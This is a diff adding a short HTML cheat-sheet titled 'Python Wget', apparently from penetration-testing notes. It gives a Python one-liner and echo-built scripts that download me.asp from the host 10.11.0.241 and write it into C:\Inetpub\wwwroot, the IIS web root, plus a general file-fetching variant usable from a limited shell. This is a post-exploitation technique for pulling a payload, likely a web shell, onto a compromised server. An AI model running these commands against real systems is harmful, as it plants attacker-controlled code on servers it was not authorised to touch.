@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Python Wget</title>
+</head><body>Two ways: <br/>
+python.exe -c "import urllib2; response=urllib2.urlopen('http://10.11.0.241:80/me.asp'); content=response.read(); f=open('C:\\Inetpub\\wwwroot\\me.asp','w+'); f.write(content); f.close();"<br/>
+<br/>
+<br/>
+Or write it all to a file<br/>
+echo import urllib2; &gt;getme.py<br/>
+echo response=urllib2.urlopen('http://10.11.0.241:80/me.asp');&gt;&gt;getme.py<br/>
+echo content=response.read();&gt;&gt;getme.py<br/>
+echo f=open('C:\\Inetpub\\wwwroot\\me.asp','w+');&gt;&gt;getme.py<br/>
+echo f.write(content); f.close();&gt;&gt;getme.py<br/>
+<br/>
+python getme.py<br/>
+<br/>
+<br/>
+<br/>
+args: wget get_file where_to_put<br/>
+Or write it all to a file<br/>
+echo import urllib2; &gt;getme.py<br/>
+echo import &nbsp;sys;&gt;&gt;getme.py<br/>
+echo url=sys.argv[1];&gt;&gt;getme.py<br/>
+echo print(url);&gt;&gt;getme.py<br/>
+echo out=sys.argv[2];&gt;&gt;getme.py<br/>
+echo print(out);&gt;&gt;getme.py<br/>
+echo response=urllib2.urlopen(url);&gt;&gt;getme.py<br/>
+echo content=response.read();&gt;&gt;getme.py<br/>
+echo f=open(out,'w+');&gt;&gt;getme.py<br/>
+echo f.write(content); f.close();&gt;&gt;getme.py<br/>
+<br/>
+python getme.py</body></html>
